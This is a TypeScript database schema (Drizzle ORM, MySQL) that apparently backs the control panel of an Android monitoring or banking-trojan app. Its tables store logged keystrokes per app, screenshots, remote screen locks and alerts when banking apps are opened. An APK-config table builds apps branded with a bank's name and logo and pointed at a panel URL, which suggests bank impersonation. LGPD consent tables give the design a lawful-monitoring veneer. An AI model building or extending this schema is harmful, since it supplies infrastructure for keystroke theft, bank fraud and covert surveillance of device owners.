import { int, mysqlEnum, mysqlTable, text, timestamp, uniqueIndex, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Keylogs table for tracking device keystrokes
export const keylogs = mysqlTable("keylogs", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: varchar("deviceId", { length: 64 }).notNull(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }).notNull(),
  keyText: text("keyText").notNull(),
  isDeleted: int("isDeleted").default(0).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Keylog = typeof keylogs.$inferSelect;
export type InsertKeylog = typeof keylogs.$inferInsert;

export const screenshots = mysqlTable("screenshots", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: int("deviceId").notNull(),
  userId: int("userId").notNull(),
  screenshotUrl: text("screenshotUrl").notNull(),
  fileSize: int("fileSize"),
  captureType: mysqlEnum("captureType", ["manual", "automatic", "alert"]).default("automatic").notNull(),
  description: text("description"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export const appsData = mysqlTable("appsData", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: int("deviceId").notNull(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }).notNull(),
  appPackage: varchar("appPackage", { length: 255 }).notNull(),
  appType: mysqlEnum("appType", ["system", "user", "corporate"]).notNull(),
  isInstalled: int("isInstalled").default(1).notNull(),
  timeUsed: int("timeUsed").default(0).notNull(),
  lastUsed: timestamp("lastUsed").defaultNow().notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export const screenLocks = mysqlTable("screenLocks", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: int("deviceId").notNull(),
  userId: int("userId").notNull(),
  lockType: mysqlEnum("lockType", ["remote_lock", "automatic_lock", "unlock"]).notNull(),
  reason: text("reason"),
  isLocked: int("isLocked").default(0).notNull(),
  unlockedAt: timestamp("unlockedAt"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export const bankAccessAlerts = mysqlTable("bankAccessAlerts", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: int("deviceId").notNull(),
  userId: int("userId").notNull(),
  bankName: varchar("bankName", { length: 255 }).notNull(),
  bankApp: varchar("bankApp", { length: 255 }).notNull(),
  accessTime: timestamp("accessTime").defaultNow().notNull(),
  duration: int("duration"),
  location: text("location"),
  alertSent: int("alertSent").default(0).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export const lgpdConsents = mysqlTable("lgpdConsents", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId"),
  consentType: mysqlEnum("consentType", ["monitoring", "data_collection", "screenshot", "location", "app_monitoring"]).notNull(),
  isConsented: int("isConsented").default(1).notNull(),
  consentDate: timestamp("consentDate"),
  expiresAt: timestamp("expiresAt"),
  documentVersion: varchar("documentVersion", { length: 255 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export const auditLogs = mysqlTable("auditLogs", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull(),
  deviceId: int("deviceId"),
  action: text("action").notNull(),
  actorType: mysqlEnum("actorType", ["admin", "user", "system"]).notNull(),
  status: mysqlEnum("status", ["success", "failure"]).notNull(),
  actorId: int("actorId"),
  dataAccessed: text("dataAccessed"),
  ipAddress: varchar("ipAddress", { length: 255 }),
  userAgent: text("userAgent"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export const dataRetentionPolicies = mysqlTable("dataRetentionPolicies", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull(),
  dataType: mysqlEnum("dataType", ["screenshots", "events", "location", "apps", "all"]).notNull(),
  retentionDays: int("retentionDays").default(365).notNull(),
  autoDelete: int("autoDelete").default(1).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastDeletedAt: timestamp("lastDeletedAt"),
});

export const apkRuntimeConfigs = mysqlTable(
  "apkRuntimeConfigs",
  {
    id: int("id").autoincrement().primaryKey(),
    packageName: varchar("packageName", { length: 255 }).notNull(),
    panelUrl: text("panelUrl").notNull(),
    appName: varchar("appName", { length: 80 }).notNull(),
    logoUrl: text("logoUrl"),
    bankId: varchar("bankId", { length: 80 }),
    bankCountry: varchar("bankCountry", { length: 80 }),
    bankName: varchar("bankName", { length: 255 }),
    artifactSource: varchar("artifactSource", { length: 20 }),
    buildId: varchar("buildId", { length: 64 }).notNull(),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  },
  (table) => ({
    packageNameUnique: uniqueIndex("apkRuntimeConfigs_packageName_unique").on(table.packageName),
  })
);

// TODO: Add your tables here